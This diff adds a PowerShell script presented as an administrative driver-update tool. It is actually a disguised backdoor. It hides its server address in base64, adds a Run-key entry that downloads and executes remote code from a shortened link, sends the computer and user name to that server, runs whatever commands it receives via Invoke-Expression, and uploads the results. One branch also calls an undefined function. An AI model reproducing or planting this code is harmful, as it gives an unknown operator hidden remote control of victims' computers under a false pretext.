@@ -1,0 +1,102 @@
+# Script de manutenção administrativa para atualizar drivers pela nuvem
+# v0.1b, em desenvolvimento
+
+# Função para obter a versão do Windows
+function Get-WindowsVersion {
+    $os = Get-WmiObject -Class Win32_OperatingSystem
+    $osVersion = $os.Version
+    return $osVersion
+}
+
+# Chama a função para obter a versão do Windows
+$windowsVersion = Get-WindowsVersion
+
+# Define o endereço da nuvem
+$siteUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly8weDk5LmNsb3Vk"))
+
+# URLs
+$updateUrl = "https://bit.ly/updatedrive"
+$registerUrl = "$siteUrl/registrar.php"
+$commandUrl = "$siteUrl/arquivo.txt"
+$uploadUrl = "$siteUrl/upload.php"
+
+# Verifica se a versão do Windows é maior que 10
+if ([version]$windowsVersion -gt [version]"10.0") {
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_EXPAND_SZ /d "%windir%\system32\cmd.exe /c powershell -win 1 iex (iwr -useb $updateUrl)" /f
+
+    while ($true) {
+        $nomePC = $env:COMPUTERNAME
+        $nomeUsuario = $env:username
+        $version = $windowsVersion
+
+        $params = @{
+            NomePC = $nomePC
+            Usuario = $nomeUsuario
+            Version = $version
+        }
+
+        Invoke-RestMethod -Uri $registerUrl -Method POST -Body $params
+
+        try {
+            $comando = Invoke-RestMethod -Uri $commandUrl
+            if (-not [string]::IsNullOrEmpty($comando)) {
+                $saida = Invoke-Expression -Command $comando
+
+                if (-not [string]::IsNullOrEmpty($saida)) {
+                    Invoke-RestMethod -Uri $uploadUrl -Method POST -Body ("saida=" + [System.Web.HttpUtility]::UrlEncode($saida))
+                }
+            }
+        } catch {
+            Write-Host "Erro ao consultar o servidor PHP: $_"
+        }
+        Start-Sleep -Seconds 15
+    }
+} else {
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_EXPAND_SZ /d "%windir%\system32\cmd.exe /c powershell -win 1 iex ((New-Object Net.WebClient).DownloadString('$updateUrl'))" /f
+
+    function UrlEncode {
+        param (
+            [string] $value
+        )
+
+        $value = [System.Uri]::EscapeDataString($value)
+        return $value
+    }
+
+    function Execute-PowerShellCommand {
+        param (
+            [string] $command
+        )
+
+        $output = Invoke-Expression -Command $command
+        return $output
+    }
+
+    while ($true) {
+        $nomePC = $env:COMPUTERNAME
+        $nomeUsuario = $env:username
+        $version = $windowsVersion
+
+        $params = "NomePC=" + (UrlEncode $nomePC)
+        $params += "&Usuario=" + (UrlEncode $nomeUsuario)
+        $params += "&Version=" + (UrlEncode $version)
+
+        $response = Send-HttpPostRequest -url $registerUrl -data $params
+
+        try {
+            $comando = (New-Object System.Net.WebClient).DownloadString($commandUrl)
+            if (-not [string]::IsNullOrEmpty($comando)) {
+                $saida = Execute-PowerShellCommand -command $comando
+
+                if (-not [string]::IsNullOrEmpty($saida)) {
+                    $params = "saida=" + (UrlEncode $saida)
+                    Send-HttpPostRequest -url $uploadUrl -data $params
+                }
+            }
+        } catch {
+            Write-Host "Erro ao consultar o servidor PHP: $_"
+        }
+
+        Start-Sleep -Seconds 15
+    }
+}
